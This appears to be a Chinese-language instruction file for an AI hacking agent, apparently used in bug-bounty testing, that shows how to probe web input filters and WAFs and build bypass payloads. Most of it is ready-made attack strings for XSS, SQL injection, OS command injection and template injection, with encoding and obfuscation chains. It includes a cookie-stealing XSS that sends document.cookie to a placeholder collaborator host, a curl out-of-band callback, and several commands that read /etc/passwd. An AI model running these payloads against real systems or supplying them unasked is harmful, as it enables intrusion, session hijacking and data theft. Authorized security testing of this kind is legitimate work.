---
name: craft-payload
description: 标准攻击失败时的自适应 payload 构造——探过滤器、建绕过链、增量测试
---

# 造自定义 payload

> **规则引用（R12）：** 安全约束（无破坏性 payload、无真实数据外泄、OOB 回调规则）在 `.claude/rules/hunting.md` Rule 5–9a。本 skill 描述 payload 构造**技术**；规则编号管允许什么。

标准 payload 被拦。理解**什么**被滤并造绕过。

## SMART MOVE —— 首调

```
1. pick_tool(<vuln_class>) → confirms canonical tool for the class
2. get_payloads(category, context, waf_bypass=True) — context-specific set
3. mutate_payload(base_payload, mutations=[...]) — encoding chains
4. transform_chain([encoders...]) — multi-layer obfuscation
5. confirm_<class>(target, parameter, payload=mutated) — proves bypass works
```

已知 CVE PoC 失败：切 `smart-move-known-cve-poc-fails.md`（变体扫胜手动 mutation）。

## Phase 1：侦察过滤器（最多 3-5 调）

### Step 1：字符级探测

发单独特殊字符查哪些存活：

```python
fuzz_parameter(index, parameter=param, payloads=[
    # HTML/XML 特殊字符
    "<", ">", "'", '"', "/", "\\",
    # SQL 特殊字符
    "'", "--", ";", "/*", "*/",
    # 命令特殊字符
    "|", "&", "`", "$", "(", ")",
    # 模板特殊字符
    "{", "}", "{{", "}}", "${", "<%",
    # 编码字符
    "%", "\\x", "\\u",
    # Null/空白
    "%00", "%0a", "%0d", "\t",
], grep_match=["<", ">", "'", '"', "{", "}", "|", "&", "$"])
```

**细读结果。** 建过滤器图：

| 字符 | 输入 | 输出 | 状态 |
|---|---|---|---|
| `<` | `<` | `&lt;` | HTML 编码 |
| `>` | `>` | `&gt;` | HTML 编码 |
| `'` | `'` | `'` | 允 |
| `"` | `"` | `&quot;` | HTML 编码 |
| `{{` | `{{` | `` | 剥离 |
| `${` | `${` | `${` | 允 |

此图告诉你**精确**用何绕过策略。

### Step 2：关键字级探测

```python
fuzz_parameter(index, parameter=param, payloads=[
    # HTML tag
    "script", "<script>", "<img", "<svg", "<iframe",
    # SQL 关键字
    "SELECT", "UNION", "OR", "AND", "SLEEP", "WAITFOR",
    # OS 命令
    "cat", "id", "whoami", "ping", "curl", "wget",
    # 函数
    "alert", "confirm", "prompt", "system", "exec",
    # 事件
    "onerror", "onload", "onclick", "onmouseover",
])
```

**找什么：**
- 全同响应 = 无关键字过滤（问题在别处）
- 部分拦部分允 = 关键字黑名单（用大小写混、编码、拼接绕）
- 全不同拦 = WAF（查 403 响应中 WAF 签名）

### Step 3：识别 WAF 厂商（若适用）

```python
# 发已知 WAF 触发并读错页
session_request(session, "GET", f"{path}?{param}=<script>alert(1)</script>")
# 查响应中 WAF 签名：
# "cloudflare" -> Cloudflare WAF
# "akamai" -> Akamai
# "mod_security" / "ModSecurity" -> ModSecurity
# "AWS WAF" / "Forbidden" with specific headers -> AWS WAF
# "imperva" / "incapsula" -> Imperva
# "f5" / "ASM" -> F5 BIG-IP
```

## Phase 2：选绕过策略

按过滤器图选对路：

### 策略 A：编码绕过（过滤器查 raw 输入，后端解码）

**首选：用 `transform_chain` 一调做多层编码：**
```python
# 一调多层绕过（替 3 个独立 decode_encode 调）
transform_chain("<script>alert(1)</script>", ["url_encode", "base64_encode", "url_encode"])

# 检测响应值应用了何编码
detect_encoding("mystery_encoded_string")

# 自动剥所有编码层
smart_decode("nested_encoded_value")
```

**单编码操作：**
```python
# URL 编码
decode_encode("<script>alert(1)</script>", "url_encode")

# 双 URL 编码（后端解码两次时）
decode_encode("<script>alert(1)</script>", "double_url_encode")

# HTML 实体编码
decode_encode("<script>alert(1)</script>", "html_encode")

# Unicode 编码
decode_encode("<script>", "unicode_escape")
```

**对过滤器测每编码：**
```python
fuzz_parameter(index, parameter=param, payloads=[
    "%3Cscript%3Ealert(1)%3C/script%3E",           # URL 编码
    "%253Cscript%253Ealert(1)%253C/script%253E",     # 双 URL 编码
    "&#60;script&#62;alert(1)&#60;/script&#62;",     # HTML 实体（十进制）
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", # HTML 实体（十六进制）
])
```

### 策略 B：大小写与拼接绕过（关键字黑名单）

```python
# 大小写混
payloads = [
    "<ScRiPt>alert(1)</sCrIpT>",
    "<IMG SRC=x OnErRoR=alert(1)>",
    "sElEcT * fRoM users",
]

# 注释垫 SQL 关键字
payloads = [
    "1' UN/**/ION SEL/**/ECT NULL--",
    "1'/**/UNION/**/SELECT/**/NULL--",
    "/*!50000UNION*//*!50000SELECT*/NULL",  # MySQL 版本注释
]

# JS 执行的字符串拼接
payloads = [
    "window['al'+'ert'](1)",                # 括号记法 + 拼接
    "atob('YWxlcnQoMSk=')",                # Base64 解码
    "Function('ale'+'rt(1)')()",            # Function 构造器
    "setTimeout('ale'+'rt(1)',0)",          # setTimeout 字符串参
]

# OS 命令拼接
payloads = [
    "w'h'o'am'i",                           # 引号断命令名
    "c${z}at /etc/passwd",                  # Null 变量插入
    "/???/id",                               # Glob 展开
    "$IFS$9id",                              # IFS 替空格
]
```

### 策略 C：替代语法绕过（特定 tag / 函数被拦）

```python
# <script> 被拦，用事件处理器：
get_payloads(category="xss", context="waf_bypass")

# alert() 被拦：
payloads = [
    "<img src=x onerror=confirm(1)>",         # confirm 替
    "<img src=x onerror=prompt(1)>",          # prompt 替
    "<svg onload=alert`1`>",                   # 模板字面量调用
    "<details open ontoggle=alert(1)>",        # 较少事件
    "<body onpageshow=alert(1)>",              # body 事件
    "<marquee onstart=alert(1)>x</marquee>",  # 遗留元素
]

# img/script/svg 被拦：
payloads = [
    "<video><source onerror=alert(1)>",        # video 元素
    "<math><mi//xlink:href='javascript:alert(1)'>", # MathML
    "<input autofocus onfocus=alert(1)>",      # input autofocus
    "<select autofocus onfocus=alert(1)>",     # select autofocus
]

# UNION/SELECT 被拦（SQL）：
payloads = [
    "1' AND SLEEP(3)--",                       # Time-based（无需关键字）
    "1' AND ExtractValue(1,CONCAT(0x7e,version()))--", # Error-based
    "1' AND IF(1=1,SLEEP(3),0)--",             # 条件 timing
]

# 常用命令被拦（OS）：
payloads = [
    "; {cat,/etc/passwd}",                     # 大括号展开
    "| rev<<<'di'",                            # 反转字符串
    "$'\\x69\\x64'",                           # 十六进制 ANSI-C 引用
]
```

### 策略 D：上下文特定构造

**属性上下文中的 XSS：**
```python
# 定引号类型（单 vs 双）
# 在 value="..." 中：
payloads = ['" onmouseover=alert(1) x="', '" autofocus onfocus=alert(1) x="']
# 在 value='...' 中：
payloads = ["' onmouseover=alert(1) x='", "' autofocus onfocus=alert(1) x='"]
# 无引号：
payloads = [" onmouseover=alert(1)", " autofocus onfocus=alert(1)"]
```

**JavaScript 上下文中的 XSS：**
```python
# 在 var x = "INPUT" 中：
payloads = ['"-alert(1)-"', '";alert(1)//', '</script><script>alert(1)</script>']
# 在 var x = 'INPUT' 中：
payloads = ["'-alert(1)-'", "';alert(1)//", "</script><script>alert(1)</script>"]
# 在模板字面量 `INPUT` 中：
payloads = ["`${alert(1)}`", "${alert(1)}"]
```

**特定 DB 的 SQLi：**
```python
get_payloads(category="sqli", context="mysql")       # MySQL 特定
get_payloads(category="sqli", context="postgresql")   # PostgreSQL 特定
get_payloads(category="sqli", context="mssql")        # MSSQL 特定
```

**特定引擎的 SSTI：**
```python
# 先识引擎
probe_endpoint(session, method, path, param,
               test_payloads=["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"])
# {{7*7}}=49: Jinja2/Twig/Handlebars
# ${7*7}=49: FreeMarker/Mako/EL
# <%=7*7%>=49: ERB

# 然后取引擎特定 RCE payload
get_payloads(category="ssti", context="jinja2")
```

## Phase 3：增量测试

勿盲抛复杂 payload。增量建：

### XSS 增量法
```
步 1：能注 HTML？         -> <b>test</b>
步 2：能注属性？         -> <b id=test>
步 3：能注事件？         -> <b onmouseover=1>
步 4：能调函数？         -> <b onmouseover=alert(1)>
步 5：能执行 JS？         -> <img src=x onerror=alert(document.domain)>
```

### SQLi 增量法
```
步 1：引号断语法？       -> '
步 2：能闭查询？         -> ' OR '1'='1
步 3：能加逻辑？         -> ' AND 1=1-- vs ' AND 1=2--
步 4：能抽数据？         -> ' UNION SELECT NULL--
步 5：能拿啥数据？       -> ' UNION SELECT version()--
```

### CMDi 增量法
```
步 1：分隔符可用？       -> ; (or | or & or ` or $())
步 2：能跑命令？         -> ; id
步 3：能拿输出？         -> ; echo UNIQUE_MARKER
步 4：若盲，timing？     -> ; sleep 5
步 5：若盲，OOB？        -> ; curl http://COLLABORATOR
```

### 每步用 fuzz_parameter：
```python
fuzz_parameter(index, parameter=param,
    payloads=["<b>test</b>", "<b id=x>", "<b onmouseover=1>"],
    grep_match=["<b>test</b>", "<b id=x>", "<b onmouseover"])
```

## Phase 4：Payload 变换流水线

找到可用原语后，变换求最大影响：

```python
# 1. 从可用原语起
working = "<img src=x onerror=alert(1)>"

# 2. 用影响演示替 alert
impact = "<img src=x onerror=fetch('https://COLLABORATOR/steal?c='+document.cookie)>"

# 3. 需编码则变换
encoded = decode_encode(impact, "url_encode")

# 4. 需双编码则
double_encoded = decode_encode(impact, "double_url_encode")

# 5. 测变换后 payload
session_request(session, "GET", f"{path}?{param}={encoded}")
```

## Phase 5：存绕过

记可用之物供下会话：

```python
save_target_notes(domain, """
## Filter Bypass Notes

### XSS Filter on /search?q
- HTML tags: <script> BLOCKED, <img> ALLOWED, <svg> ALLOWED
- Events: onerror ALLOWED, onload BLOCKED, ontoggle ALLOWED
- Functions: alert BLOCKED, confirm ALLOWED
- Working payload: <img src=x onerror=confirm(1)>
- Working encoded: %3Cimg%20src%3Dx%20onerror%3Dconfirm(1)%3E

### SQLi Filter on /api/users?id
- Keywords: UNION BLOCKED, SELECT BLOCKED, SLEEP ALLOWED
- Comments: /**/ ALLOWED, -- ALLOWED
- Bypass: 1' AND SLEEP(3)-- (time-based blind works)
- Bypass: 1'/**/UNION/**/SELECT/**/NULL-- (comment-padded keywords)

### WAF: Cloudflare (detected via cf-ray header)
- Blocks: <script>, UNION SELECT, alert(
- Allows: <svg>, template literals
""")
```

## 速查：按过滤器类型的绕过技术

| 过滤器 | 绕过 | 例 |
|---|---|---|
| `<script>` 拦 | 替代 tag | `<img>`、`<svg>`、`<details>`、`<body>` |
| `alert` 拦 | 替代函数 | `confirm`、`prompt`、base64 解码链 |
| 引号拦 | 反引号或无引号 | 模板字面量、无引号事件处理器 |
| 空格拦 | Tab、newline、slash | `<svg/onload=alert(1)>`、`{cat,/etc/passwd}` |
| `../` 剥 | 双编码 | `..%252f`、`....//`、`..%c0%af` |
| UNION/SELECT 拦 | 注释垫 | `UN/**/ION SEL/**/ECT`、`/*!UNION*/` |
| 分号拦 | AND/pipe 操作符 | `&& id`、`\|\| id`、newline `%0a` |
| WAF 全拦 | 编码链 | 双 URL + 大小写混 + 注释垫 |
| HTML 编码输出 | 属性突围 | `" autofocus onfocus=alert(1) x="` |
| 输入长度限 | 短 payload | `<svg/onload=alert(1)//`、`';alert(1)//` |
